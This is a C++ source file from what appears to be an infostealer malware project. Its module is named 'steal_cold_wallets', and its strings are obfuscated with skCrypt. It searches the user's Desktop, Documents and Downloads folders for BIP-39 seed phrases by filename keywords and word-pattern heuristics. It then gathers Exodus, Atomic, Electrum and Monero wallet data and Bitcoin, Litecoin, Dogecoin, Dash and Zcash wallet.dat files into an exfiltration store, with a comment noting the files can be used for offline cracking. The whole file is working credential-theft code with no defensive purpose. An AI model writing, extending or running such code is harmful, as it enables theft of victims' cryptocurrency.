#include <misc_stealing/cold_wallets.hpp>
#include <filesystem>
#include <fstream>
#include <sstream>
#include <string>
#include <algorithm>
#include <windows.h>
#include <sysinfo.hpp>
#include <exfiltration_utils/mem_store.hpp>
#include <crypto_utils/skCrypter.hpp>

namespace fs = std::filesystem;

namespace misc_exfiltration {

static bool has_seed_keyword(const std::string& name) {
    static const char* kws[] = {
        skCrypt("seed"), skCrypt("mnemonic"), skCrypt("recovery"), skCrypt("phrase"),
        skCrypt("wallet"), skCrypt("backup"), skCrypt("secret"), skCrypt("crypto")
    };
    std::string lower = name;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
    for (const char* kw : kws)
        if (lower.find(kw) != std::string::npos) return true;
    return false;
}

//ai

//BIP-39 seeds are 12 or 24 lowercase English words, 3-8 chars each, space-separated
static bool looks_like_seed(const std::string& content) {
    std::istringstream ss(content);
    std::string word;
    int total = 0, valid = 0;
    while (ss >> word && total < 30) {
        total++;
        word.erase(std::remove_if(word.begin(), word.end(),
            [](char c) { return !isalpha((unsigned char)c); }), word.end());
        if (word.size() >= 3 && word.size() <= 8 &&
            std::all_of(word.begin(), word.end(), [](char c) { return islower((unsigned char)c); }))
            valid++;
    }
    return (total == 12 || total == 24) && valid >= total - 2;
}

static void scan_dir(const fs::path& dir) {
    if (!fs::exists(dir)) return;
    try {
        for (const auto& entry : fs::recursive_directory_iterator(dir,
            fs::directory_options::skip_permission_denied)) {
            if (!entry.is_regular_file()) continue;

            auto sz = entry.file_size();
            if (sz == 0 || sz > 4096) continue;

            std::string fname = entry.path().filename().string();
            bool match = has_seed_keyword(fname);

            if (!match) {
                std::string ext = entry.path().extension().string();
                if (ext != skCrypt(".txt") && ext != skCrypt(".md") && ext != "" && ext != skCrypt(".bak") && ext != skCrypt(".key"))
                    continue;
                try {
                    std::ifstream f(entry.path());
                    std::string content((std::istreambuf_iterator<char>(f)), {});
                    match = looks_like_seed(content);
                } catch (const std::exception&) {}
            }

            if (!match) continue;

            //just filename to avoid subdirectory nesting
            std::string flat = entry.path().string();
            std::replace(flat.begin(), flat.end(), '\\', '_');
            std::replace(flat.begin(), flat.end(), '/', '_');
            std::replace(flat.begin(), flat.end(), ':', '_');
            if (flat.size() > 80) flat = flat.substr(flat.size() - 80);

            mem_store::import_file(skCrypt("cold_wallets/") + flat, entry.path());
        }
    } catch (const std::exception&) {}
}

void steal_cold_wallets() {
    fs::path home = features::get_home();
    std::string rapp = features::get_home() + skCrypt("\\AppData\\Roaming\\");

    //seed phrase scan on common user dirs
    for (const char* sub : { (const char*)skCrypt("Desktop"), (const char*)skCrypt("Documents"), (const char*)skCrypt("Downloads") })
        scan_dir(home / sub);

    //exodus: wallet dir contains encrypted keystore + accounts config
    {
        fs::path exodus = fs::path(rapp) / skCrypt("Exodus") / skCrypt("exodus.wallet");
        mem_store::import_tree(skCrypt("wallets/exodus"), exodus, 2 * 1024 * 1024);
    }

    //atomic wallet
    {
        fs::path atomic = fs::path(rapp) / skCrypt("atomic") / skCrypt("Local Storage") / skCrypt("leveldb");
        mem_store::import_tree(skCrypt("wallets/atomic"), atomic, 2 * 1024 * 1024);
    }

    //electrum: wallet files are encrypted json keystores
    {
        fs::path electrum = fs::path(rapp) / skCrypt("Electrum") / skCrypt("wallets");
        mem_store::import_tree(skCrypt("wallets/electrum"), electrum, 1 * 1024 * 1024);
    }

    //core wallet.dat files, importable into any core client for offline cracking
    {
        fs::path btc  = fs::path(rapp) / skCrypt("Bitcoin")   / skCrypt("wallet.dat");
        fs::path ltc  = fs::path(rapp) / skCrypt("Litecoin")  / skCrypt("wallet.dat");
        fs::path doge = fs::path(rapp) / skCrypt("DogeCoin")  / skCrypt("wallet.dat");
        fs::path dash = fs::path(rapp) / skCrypt("DashCore")  / skCrypt("wallet.dat");
        fs::path zcash = fs::path(rapp) / skCrypt("Zcash")    / skCrypt("wallet.dat");
        if (fs::exists(btc))   mem_store::import_file(skCrypt("wallets/bitcoin_wallet.dat"),  btc);
        if (fs::exists(ltc))   mem_store::import_file(skCrypt("wallets/litecoin_wallet.dat"), ltc);
        if (fs::exists(doge))  mem_store::import_file(skCrypt("wallets/dogecoin_wallet.dat"), doge);
        if (fs::exists(dash))  mem_store::import_file(skCrypt("wallets/dash_wallet.dat"),     dash);
        if (fs::exists(zcash)) mem_store::import_file(skCrypt("wallets/zcash_wallet.dat"),    zcash);
    }

    //monero gui default wallet location
    {
        fs::path xmr = home / skCrypt("Documents") / skCrypt("Monero") / skCrypt("wallets");
        mem_store::import_tree(skCrypt("wallets/monero"), xmr, 10 * 1024 * 1024);
    }
}

}
